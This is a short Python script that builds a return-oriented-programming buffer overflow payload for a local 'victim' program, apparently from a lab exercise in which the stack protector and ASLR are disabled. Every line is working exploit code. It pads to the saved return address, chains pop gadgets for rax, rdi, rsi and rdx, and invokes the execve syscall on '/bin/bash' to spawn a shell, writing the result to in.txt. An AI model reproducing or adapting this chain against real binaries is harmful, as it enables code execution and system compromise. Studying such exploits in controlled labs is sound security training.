from struct import *

# gcc -fno-stack-protector -static victim.c -o victim
# Disable ASLR: echo 0 > /proc/sys/kernel/randomize_va_space

buf = "A" * 72                    # offset from buffer to ret saved rip
buf += pack("<Q", 0x0047466b)     #(b'58c3') pop rax; ret
buf += pack("<Q", 0x3b)           # execve system call number
buf += pack("<Q", 0x0040f000)     # (b'5fc3') pop rdi; ret
buf += pack("<Q", 0x7fffffffe8f2) # "/bin/bash" address from ENV
buf += pack("<Q", 0x00414202)     # (b'5ec3') pop rsi; ret
buf += pack("<Q", 0x0)            # null
buf += pack("<Q", 0x00455d54)     # (b'5ac3') pop rdx; ret
buf += pack("<Q", 0x0)            # null
buf += pack("<Q", 0x00467bf5)     # (b'0f05c3')	syscall; ret

with open("in.txt", "w") as f:
    f.write(buf)
